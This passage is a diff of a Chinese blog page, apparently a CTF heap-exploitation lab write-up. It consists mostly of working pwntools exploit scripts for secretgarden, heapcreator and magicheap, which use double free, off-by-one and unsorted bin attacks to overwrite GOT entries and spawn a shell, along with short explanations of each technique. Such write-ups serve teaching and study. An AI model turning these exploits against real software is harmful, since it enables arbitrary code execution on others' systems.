+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(idx))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;:&#34;</span>, name)
 
-def change(idx, length, name):
-    io.sendlineafter(&quot;:&quot;, &quot;3&quot;)
-    io.sendlineafter(&quot;:&quot;, str(idx))
-    io.sendlineafter(&quot;:&quot;, str(length))
-    io.sendafter(&quot;:&quot;, name)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(idx))
 
-def remove(idx):
-    io.sendlineafter(&quot;:&quot;, &quot;4&quot;)
-    io.sendlineafter(&quot;:&quot;, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit</span>():
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;5&#34;</span>)
 
-def exit():
-    io.sendlineafter(&quot;:&quot;, &quot;5&quot;)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    add(<span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+    add(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+    add(<span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+    ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6020c8</span>
 
-if __name__ == &quot;__main__&quot;:
-    add(0x40, '0' * 8)
-    add(0x80, '1' * 8)
-    add(0x40, '2' * 8)
-    ptr = 0x6020c8
-
-    fakeChunk = flat([0, 0x41, ptr - 0x18, ptr - 0x10, cyclic(0x20), 0x40, 0x90])
-    change(0, 0x80, fakeChunk)
-    remove(1)
-    payload = flat([0, 0, 0x40, elf.got['atoi']])
-    change(0, 0x80, payload)
+    fakeChunk <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x41</span>, ptr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>, ptr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>, cyclic(<span style="color:#ae81ff">0x20</span>), <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x90</span>])
+    change(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80</span>, fakeChunk)
+    remove(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]])
+    change(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80</span>, payload)
     show()
-    libc.address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
-    success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))
-    #  libcBase = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
-    #  success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+    success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
+    <span style="color:#75715e">#  libcBase = u64(io.recvuntil(&#34;\x7f&#34;)[-6: ].ljust(8, &#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span>
+    <span style="color:#75715e">#  success(&#34;libcBase -&gt; {:#x}&#34;.format(libcBase))</span>
     pause()
 
-    change(0, 0x8, p64(libc.sym['system']))
-    #  change(0, 0x8, p64(libcBase + libc.sym['system']))
-    io.sendline('$0')
+    change(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x8</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]))
+    <span style="color:#75715e">#  change(0, 0x8, p64(libcBase + libc.sym[&#39;system&#39;]))</span>
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;$0&#39;</span>)
 
-    io.interactive()
-    io.close()
-</code></pre>
-
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <p>可以看出，通过 house of house 直接控制函数指针进而控制 ip 的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会</p>
 
 <h3 id="lab12-secretgarden">lab12-secretgarden</h3>
 
 <p>通过 double free 实现 fastbin attack 的题目，所谓double free，指的就是对同一个 allocated chunk free 两次，这样就可以形成一个类似 <strong>0  -&gt; 1 -&gt; 0</strong> 的 cycled bin list，这样当我们 malloc 出 0 时，就可以修改 bin list 中 0 的 fd，如 <strong>1 -&gt; 0 -&gt; target</strong>，这样只要我们再 malloc 三次，并通过 malloc 的检查，就可以实现 malloc 到任何地址，进而实现任意地址写，至于 double free 的检查怎么绕过可以看这个<a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
 
-from pwn import *
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>():
+    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+    gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *0x4009F2&#34;</span>)
 
-def DEBUG():
-    raw_input(&quot;DEBUG: &quot;)
-    gdb.attach(io, &quot;b *0x4009F2&quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Raise</span>(length, name):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34; :&#34;</span>, name)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;nb&#34;</span>)
 
-def Raise(length, name):
-    io.sendlineafter(&quot; : &quot;, &quot;1&quot;)
-    io.sendlineafter(&quot; :&quot;, str(length))
-    io.sendafter(&quot; :&quot;, name)
-    io.sendlineafter(&quot; :&quot;, &quot;nb&quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, str(idx))
 
-def remove(idx):
-    io.sendlineafter(&quot; : &quot;, &quot;3&quot;)
-    io.sendlineafter(&quot;:&quot;, str(idx))
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    <span style="color:#75715e">#  io = process(&#34;./secretgarden&#34;, {&#34;LD_PRELOAD&#34;: &#34;./libc-2.23.so&#34;})</span>
+    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./secretgarden&#34;</span>)
 
-if __name__ == &quot;__main__&quot;:
-    #  io = process(&quot;./secretgarden&quot;, {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so&quot;})
-    io = process(&quot;./secretgarden&quot;)
+    Raise(<span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">&#34;000&#34;</span>) <span style="color:#75715e"># 0</span>
+    Raise(<span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">&#34;111&#34;</span>) <span style="color:#75715e"># 1</span>
 
-    Raise(0x50, &quot;000&quot;) # 0
-    Raise(0x50, &quot;111&quot;) # 1
+    remove(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># 0</span>
+    <span style="color:#75715e">#  pause()</span>
+    remove(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># 1 -&gt; 0</span>
+    remove(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># 0 -&gt; 1 -&gt; 0</span>
 
-    remove(0) # 0
-    #  pause()
-    remove(1) # 1 -&gt; 0
-    remove(0) # 0 -&gt; 1 -&gt; 0
+    magic <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./secretgarden&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;magic&#34;</span>]
+    <span style="color:#75715e">#  fakeChunk = 0x602028 + 2 - 8</span>
+    fakeChunk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602000</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
 
-    magic = ELF(&quot;./secretgarden&quot;).sym[&quot;magic&quot;]
-    #  fakeChunk = 0x602028 + 2 - 8
-    fakeChunk = 0x602000+2-8
+    Raise(<span style="color:#ae81ff">0x50</span>, p64(fakeChunk)) <span style="color:#75715e"># 0</span>
+    Raise(<span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">&#34;111&#34;</span>) <span style="color:#75715e"># 1</span>
+    Raise(<span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">&#34;000&#34;</span>)
+    <span style="color:#75715e">#  DEBUG()</span>
+    <span style="color:#75715e">#  payload = cyclic(8 - 2) + p64(magic) * 8</span>
+    payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> p64(magic) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
+    Raise(<span style="color:#ae81ff">0x50</span>, payload)
 
-    Raise(0x50, p64(fakeChunk)) # 0
-    Raise(0x50, &quot;111&quot;) # 1
-    Raise(0x50, &quot;000&quot;)
-    #  DEBUG()
-    #  payload = cyclic(8 - 2) + p64(magic) * 8
-    payload = cyclic(8 + 8 - 2) + p64(magic) * 2
-    Raise(0x50, payload)
-
-    io.interactive()
-    io.close()
-
-</code></pre>
-
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <blockquote>
 <p>以上的 exp 实现了通过 fastbin attack 来修改 got, 实际上通过 fastbin attack 来修改 __malloc_hook, __realloc_hook, __free_hook, IO_file_plus 结构体中的 jump_table 也是很常见的做法, 尤其是程序开了 Full Relro 保护时
 pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考这篇 <a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/">writeup</a></p>
@@ -1234,141 +1229,143 @@ pwnable.tw 的 Secret Garden 一题就用到了以上几种做法, 可以参考�
 <p>在 edit_heap 中有一个故意留下来的 off-by-one，并且不是 off-by-one null byte，因此可以使用 extended chunk 这种技巧造成 overlapping chunk，进而通过将 *content 覆写为某函数的 got (如 free/atoi )就可以 leak 出 libc 的地址，然后将改写为 system 的地址，控制参数即可 get shell</p>
 
 <p>关于 extended chunk 的介绍可以看这个 <strong><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf">slide</a></strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab13 [master<span style="color:#960050;background-color:#1e0010">●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab13 [master●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
 
-from pwn import *
-context.log_level = &quot;debug&quot;
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, content):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, str(size))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, content)
 
-def create(size, content):
-    io.sendlineafter(&quot; :&quot;, &quot;1&quot;)
-    io.sendlineafter(&quot; : &quot;, str(size))
-    io.sendlineafter(&quot;:&quot;, content)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, content):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(idx))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, content)
 
-def edit(idx, content):
-    io.sendlineafter(&quot; :&quot;, &quot;2&quot;)
-    io.sendlineafter(&quot; :&quot;, str(idx))
-    io.sendlineafter(&quot; : &quot;, content)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(idx))
 
-def show(idx):
-    io.sendlineafter(&quot; :&quot;, &quot;3&quot;)
-    io.sendlineafter(&quot; :&quot;, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(idx))
 
-def delete(idx):
-    io.sendlineafter(&quot; :&quot;, &quot;4&quot;)
-    io.sendlineafter(&quot; :&quot;, str(idx))
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./heapcreator&#34;</span>, {<span style="color:#e6db74">&#34;LD_LOADPRE&#34;</span>: <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>})
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
 
-if __name__ == &quot;__main__&quot;:
-    io = process(&quot;./heapcreator&quot;, {&quot;LD_LOADPRE&quot;: &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;})
-    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+    create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74">&#39;0000&#39;</span>) <span style="color:#75715e"># 0</span>
+    create(<span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;1111&#39;</span>) <span style="color:#75715e"># 1</span>
 
-    create(0x18, '0000') # 0
-    create(0x10, '1111') # 1
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> cyclic(<span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x41</span>)
+    edit(<span style="color:#ae81ff">0</span>, payload) <span style="color:#75715e"># overwrite 1</span>
 
-    payload = &quot;/bin/sh\0&quot; + cyclic(0x10) + p8(0x41)
-    edit(0, payload) # overwrite 1
+    delete(<span style="color:#ae81ff">1</span>) <span style="color:#75715e"># overlapping chunk</span>
 
-    delete(1) # overlapping chunk
+    freeGot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000602018</span>
+    payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> p64(freeGot)
+    create(<span style="color:#ae81ff">0x30</span>, payload)
+    show(<span style="color:#ae81ff">1</span>)
 
-    freeGot = 0x0000000000602018
-    payload = p64(0) * 4 + p64(0x30) + p64(freeGot)
-    create(0x30, payload)
-    show(1)
+    libcBase <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;free&#34;</span>]
+    success(<span style="color:#e6db74">&#34;libcBase -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libcBase))
+    <span style="color:#75715e">#  pause()</span>
+    edit(<span style="color:#ae81ff">1</span>, p64(libcBase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]))
 
-    libcBase = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, &quot;\x00&quot;)) - libc.sym[&quot;free&quot;]
-    success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
-    #  pause()
-    edit(1, p64(libcBase + libc.sym[&quot;system&quot;]))
-
-    delete(0)
-    io.interactive()
-    io.close()
-</code></pre>
-
+    delete(<span style="color:#ae81ff">0</span>)
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <h3 id="lab14-magicheap">lab14-magicheap</h3>
 
 <p>unsorted bin attack</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+<span style="color:#f92672">import</span> sys
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>]
 
-from pwn import *
-from time import sleep
-import sys
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./magicheap&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./magicheap&#34;</span>)
+<span style="color:#75715e">#  libc = ELF(&#34;&#34;)</span>
 
-io = process(&quot;./magicheap&quot;)
-elf = ELF(&quot;./magicheap&quot;)
-#  libc = ELF(&quot;&quot;)
-
-def DEBUG():
-    raw_input(&quot;DEBUG: &quot;)
-    gdb.attach(io)
-
-
-def create(size, content, attack = False):
-    io.sendlineafter(&quot;choice :&quot;, &quot;1&quot;)
-    io.sendlineafter(&quot; : &quot;, str(size))
-    io.sendlineafter(&quot;:&quot;, content)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>():
+    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+    gdb<span style="color:#f92672">.</span>attach(io)
 
 
-def edit(idx, size, content):
-    io.sendlineafter(&quot;choice :&quot;, &quot;2&quot;)
-    io.sendlineafter(&quot; :&quot;, str(idx))
-    io.sendlineafter(&quot; : &quot;, str(size))
-    io.sendlineafter(&quot; : &quot;, content)
-
-def delete(idx):
-    io.sendlineafter(&quot;choice :&quot;, &quot;3&quot;)
-    io.sendlineafter(&quot; :&quot;, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size, content, attack <span style="color:#f92672">=</span> False):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, str(size))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, content)
 
 
-if __name__ == &quot;__main__&quot;:
-    create(0x10, 'aaaa')
-    create(0x80, 'bbbb')
-    create(0x10, 'cccc')
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, size, content):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(idx))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, str(size))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, content)
 
-    delete(1)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(idx))
 
-    payload = cyclic(0x10) + p64(0) + p64(0x91) + p64(0) + p64(elf.symbols[&quot;magic&quot;] - 0x10)
-    edit(0, 0x10 + 0x20, payload)
 
-    create(0x80, 'dddd')
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    create(<span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;aaaa&#39;</span>)
+    create(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">&#39;bbbb&#39;</span>)
+    create(<span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;cccc&#39;</span>)
 
-    io.sendlineafter(&quot;choice :&quot;, &quot;4869&quot;)
-    io.interactive()
-    io.close()
+    delete(<span style="color:#ae81ff">1</span>)
 
-</code></pre>
+    payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x91</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;magic&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>, payload)
 
+    create(<span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">&#39;dddd&#39;</span>)
+
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;choice :&#34;</span>, <span style="color:#e6db74">&#34;4869&#34;</span>)
+    io<span style="color:#f92672">.</span>interactive()
+    io<span style="color:#f92672">.</span>close()</code></pre></div>
 <h3 id="lab15-zoo">lab15-zoo</h3>
 
 <p><a href="https://github.com/M4xW4n9/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf">pwn in C++</a></p>
 
 
-  </main>
+</article>
 
-<footer class="tc center bt b--near-white pvx phm pax-m phxl-l pvx-l">
-        <small class="f5 mw7 db center phm lh-copy">
-		  <nav>
-			  <ul class="list pln">
-				  <li class="dib prm"><a href="https://www.github.com/0x01f"><span class="js-geomicon geomicon blue" data-icon="github"></span></a></li>
-                  
-			  </ul>
-			  </nav>
-              Copyright-  2018
-        </small>
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://0x01f.github.io/post/pin-in-ctf/"><i class="fa fa-chevron-circle-left"></i> Pin In CTF</a>
+        </li>
+        
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright &copy; 2018 - M4x | 
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="https://0x01f.github.io/index.xml">Subscribe</a></h6>
     </footer>
-    <script src="http://d2v52k3cl9vedd.cloudfront.net/geomicons/0.2.0/geomicons.min.js.gz"></script>
-    <script>
-        var icons = document.querySelectorAll('.geomicon');
-        Geomicons.inject(icons);
-    </script>
-  </body>
-</html>
+</div>
+<script src="https://0x01f.github.io/js/scripts.js"></script>
+</body>
 
+</html>
